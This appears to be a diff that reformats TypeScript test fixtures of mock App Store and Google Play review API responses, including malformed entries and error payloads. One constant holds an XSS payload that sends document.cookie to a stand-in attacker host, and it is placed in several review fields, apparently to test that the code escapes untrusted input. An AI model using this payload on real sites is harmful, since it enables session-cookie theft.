@@ -11,7 +11,8 @@ export const APP_ID = '682658836';
 export const REVIEWS_PATH = `/v1/apps/${APP_ID}/customerReviews`;
 export const PLAY_PACKAGE = 'com.example.coffee';
 
-export const XSS = '<img src=x onerror=alert(1)><script>fetch("//evil.example/?c="+document.cookie)</script>';
+export const XSS =
+  '<img src=x onerror=alert(1)><script>fetch("//evil.example/?c="+document.cookie)</script>';
 
 // ---------------------------------------------------------------------------------------------
 // App Store Connect
@@ -20,7 +21,13 @@ export const appleReview = (
   id: string,
   rating: number,
   createdDate: string,
-  extra: { title?: string | null; body?: string | null; nickname?: string; territory?: string; response?: string } = {},
+  extra: {
+    title?: string | null;
+    body?: string | null;
+    nickname?: string;
+    territory?: string;
+    response?: string;
+  } = {},
 ) => ({
   type: 'customerReviews',
   id,
@@ -44,7 +51,12 @@ export const appleReview = (
   links: { self: `${APPLE_BASE}/v1/customerReviews/${id}` },
 });
 
-export const appleResponse = (id: string, body: string, state = 'PUBLISHED', lastModifiedDate = '2026-11-16T09:00:00-08:00') => ({
+export const appleResponse = (
+  id: string,
+  body: string,
+  state = 'PUBLISHED',
+  lastModifiedDate = '2026-11-16T09:00:00-08:00',
+) => ({
   type: 'customerReviewResponses',
   id: `resp-${id}`,
   attributes: { responseBody: body, lastModifiedDate, state },
@@ -59,9 +71,18 @@ export const applePage1 = {
       nickname: 'Pat',
       response: 'Sorry about that, please update to 2.4.1.',
     }),
-    appleReview('00000030-0000-0000-0000-000000000002', 5, '2026-11-16T10:00:00-08:00', { title: 'Great', body: 'Love it', territory: 'GBR' }),
+    appleReview('00000030-0000-0000-0000-000000000002', 5, '2026-11-16T10:00:00-08:00', {
+      title: 'Great',
+      body: 'Love it',
+      territory: 'GBR',
+    }),
   ],
-  included: [appleResponse('00000030-0000-0000-0000-000000000001', 'Sorry about that, please update to 2.4.1.')],
+  included: [
+    appleResponse(
+      '00000030-0000-0000-0000-000000000001',
+      'Sorry about that, please update to 2.4.1.',
+    ),
+  ],
   links: {
     self: `${APPLE_BASE}${REVIEWS_PATH}?limit=2&sort=-createdDate&include=response`,
     next: `${APPLE_BASE}${REVIEWS_PATH}?cursor=AQ.AMt2C-U&include=response&limit=2&sort=-createdDate`,
@@ -71,8 +92,15 @@ export const applePage1 = {
 
 export const applePage2 = {
   data: [
-    appleReview('00000030-0000-0000-0000-000000000003', 3, '2026-10-01T10:00:00-07:00', { title: 'Ok', body: 'Fine.' }),
-    appleReview('00000030-0000-0000-0000-000000000004', 2, '2026-09-01T10:00:00-07:00', { title: XSS, body: XSS, nickname: '<b>Bold</b>' }),
+    appleReview('00000030-0000-0000-0000-000000000003', 3, '2026-10-01T10:00:00-07:00', {
+      title: 'Ok',
+      body: 'Fine.',
+    }),
+    appleReview('00000030-0000-0000-0000-000000000004', 2, '2026-09-01T10:00:00-07:00', {
+      title: XSS,
+      body: XSS,
+      nickname: '<b>Bold</b>',
+    }),
   ],
   links: { self: `${APPLE_BASE}${REVIEWS_PATH}?cursor=AQ.AMt2C-U&limit=2` },
   meta: { paging: { total: 4, limit: 2 } },
@@ -81,12 +109,33 @@ export const applePage2 = {
 /** Partial, odd and unknown content: only the first entry is usable. */
 export const applePartial = {
   data: [
-    { type: 'customerReviews', id: 'ok-1', attributes: { rating: '4', createdDate: '2026-11-01T00:00:00Z', somethingNew: { nested: true } }, extraTop: 1 },
-    { type: 'customerReviews', id: 'no-rating', attributes: { createdDate: '2026-11-01T00:00:00Z' } },
-    { type: 'customerReviews', id: 'bad-rating', attributes: { rating: 9, createdDate: '2026-11-01T00:00:00Z' } },
+    {
+      type: 'customerReviews',
+      id: 'ok-1',
+      attributes: {
+        rating: '4',
+        createdDate: '2026-11-01T00:00:00Z',
+        somethingNew: { nested: true },
+      },
+      extraTop: 1,
+    },
+    {
+      type: 'customerReviews',
+      id: 'no-rating',
+      attributes: { createdDate: '2026-11-01T00:00:00Z' },
+    },
+    {
+      type: 'customerReviews',
+      id: 'bad-rating',
+      attributes: { rating: 9, createdDate: '2026-11-01T00:00:00Z' },
+    },
     { type: 'customerReviews', id: 'no-date', attributes: { rating: 3 } },
     { type: 'customerReviews', attributes: { rating: 3, createdDate: '2026-11-01T00:00:00Z' } },
-    { type: 'somethingElse', id: 'x', attributes: { rating: 3, createdDate: '2026-11-01T00:00:00Z' } },
+    {
+      type: 'somethingElse',
+      id: 'x',
+      attributes: { rating: 3, createdDate: '2026-11-01T00:00:00Z' },
+    },
     'not an object',
     null,
   ],
@@ -97,7 +146,13 @@ export const appleSummarizations = {
     {
       type: 'customerReviewSummarizations',
       id: 's1',
-      attributes: { text: 'Users like the speed; some report crashes after login.', locale: 'en-US', platform: 'IOS', territory: 'USA', createdDate: '2026-11-10T00:00:00Z' },
+      attributes: {
+        text: 'Users like the speed; some report crashes after login.',
+        locale: 'en-US',
+        platform: 'IOS',
+        territory: 'USA',
+        createdDate: '2026-11-10T00:00:00Z',
+      },
     },
     { type: 'customerReviewSummarizations', id: 's2', attributes: { platform: 'IOS' } },
   ],
@@ -115,14 +170,30 @@ export const appleErrors = {
       },
     ],
   },
-  notFound: { errors: [{ id: 'e2', status: '404', code: 'NOT_FOUND', title: 'The specified resource does not exist' }] },
-  rateLimited: { errors: [{ id: 'e3', status: '429', code: 'RATE_LIMIT_EXCEEDED', title: 'Rate limit exceeded' }] },
+  notFound: {
+    errors: [
+      {
+        id: 'e2',
+        status: '404',
+        code: 'NOT_FOUND',
+        title: 'The specified resource does not exist',
+      },
+    ],
+  },
+  rateLimited: {
+    errors: [
+      { id: 'e3', status: '429', code: 'RATE_LIMIT_EXCEEDED', title: 'Rate limit exceeded' },
+    ],
+  },
 };
 
 // ---------------------------------------------------------------------------------------------
 // Google Play
 
-export const playTimestamp = (iso: string, nanos = 0) => ({ seconds: String(Math.floor(Date.parse(iso) / 1000)), nanos });
+export const playTimestamp = (iso: string, nanos = 0) => ({
+  seconds: String(Math.floor(Date.parse(iso) / 1000)),
+  nanos,
+});
 
 export const playReview = (
   id: string,
@@ -159,7 +230,14 @@ export const playReview = (
       },
     },
     ...(extra.reply
-      ? [{ developerComment: { text: extra.reply.text, lastModified: playTimestamp(extra.reply.iso) } }]
+      ? [
+          {
+            developerComment: {
+              text: extra.reply.text,
+              lastModified: playTimestamp(extra.reply.iso),
+            },
+          },
+        ]
       : []),
   ],
 });
@@ -171,25 +249,60 @@ export const playPage1 = {
       author: 'Sam',
       reply: { text: 'Thanks, a fix is coming.', iso: '2026-11-17T12:00:00Z' },
     }),
-    playReview('gp:AOqpTOE2', 5, '2026-11-16T10:00:00Z', { text: 'Perfect', versionName: '2.3.9', versionCode: '239', language: 'de' }),
+    playReview('gp:AOqpTOE2', 5, '2026-11-16T10:00:00Z', {
+      text: 'Perfect',
+      versionName: '2.3.9',
+      versionCode: '239',
+      language: 'de',
+    }),
   ],
   tokenPagination: { nextPageToken: 'TOKEN-2' },
   pageInfo: { totalResults: 3, resultPerPage: 2, startIndex: 0 },
 };
 
 export const playPage2 = {
-  reviews: [playReview('gp:AOqpTOE3', 3, '2026-11-13T10:00:00Z', { text: XSS, author: '<script>x</script>' })],
+  reviews: [
+    playReview('gp:AOqpTOE3', 3, '2026-11-13T10:00:00Z', {
+      text: XSS,
+      author: '<script>x</script>',
+    }),
+  ],
   pageInfo: { totalResults: 3, resultPerPage: 2, startIndex: 2 },
 };
 
 export const playPartial = {
   reviews: [
-    { reviewId: 'ok', comments: [{ userComment: { text: 'fine', starRating: 4, lastModified: { seconds: '1731900000' }, surprise: true } }] },
+    {
+      reviewId: 'ok',
+      comments: [
+        {
+          userComment: {
+            text: 'fine',
+            starRating: 4,
+            lastModified: { seconds: '1731900000' },
+            surprise: true,
+          },
+        },
+      ],
+    },
     { reviewId: 'no-comments', comments: [] },
-    { reviewId: 'only-developer', comments: [{ developerComment: { text: 'hi', lastModified: { seconds: '1731900000' } } }] },
-    { reviewId: 'no-rating', comments: [{ userComment: { text: 'x', lastModified: { seconds: '1731900000' } } }] },
-    { reviewId: 'bad-time', comments: [{ userComment: { text: 'x', starRating: 3, lastModified: { seconds: 'soon' } } }] },
-    { comments: [{ userComment: { text: 'x', starRating: 3, lastModified: { seconds: '1731900000' } } }] },
+    {
+      reviewId: 'only-developer',
+      comments: [{ developerComment: { text: 'hi', lastModified: { seconds: '1731900000' } } }],
+    },
+    {
+      reviewId: 'no-rating',
+      comments: [{ userComment: { text: 'x', lastModified: { seconds: '1731900000' } } }],
+    },
+    {
+      reviewId: 'bad-time',
+      comments: [{ userComment: { text: 'x', starRating: 3, lastModified: { seconds: 'soon' } } }],
+    },
+    {
+      comments: [
+        { userComment: { text: 'x', starRating: 3, lastModified: { seconds: '1731900000' } } },
+      ],
+    },
     42,
   ],
 };
@@ -201,8 +314,17 @@ export const playTranslated = playReview('gp:TR1', 2, '2026-11-15T10:00:00Z', {
 });
 
 export const playErrors = {
-  forbidden: { error: { code: 403, message: 'The caller does not have permission', errors: [{ reason: 'forbidden' }], status: 'PERMISSION_DENIED' } },
-  quota: { error: { code: 429, message: 'Quota exceeded', errors: [{ reason: 'rateLimitExceeded' }] } },
+  forbidden: {
+    error: {
+      code: 403,
+      message: 'The caller does not have permission',
+      errors: [{ reason: 'forbidden' }],
+      status: 'PERMISSION_DENIED',
+    },
+  },
+  quota: {
+    error: { code: 429, message: 'Quota exceeded', errors: [{ reason: 'rateLimitExceeded' }] },
+  },
   notFound: { error: { code: 404, message: 'Package not found: com.example.coffee.' } },
 };
 
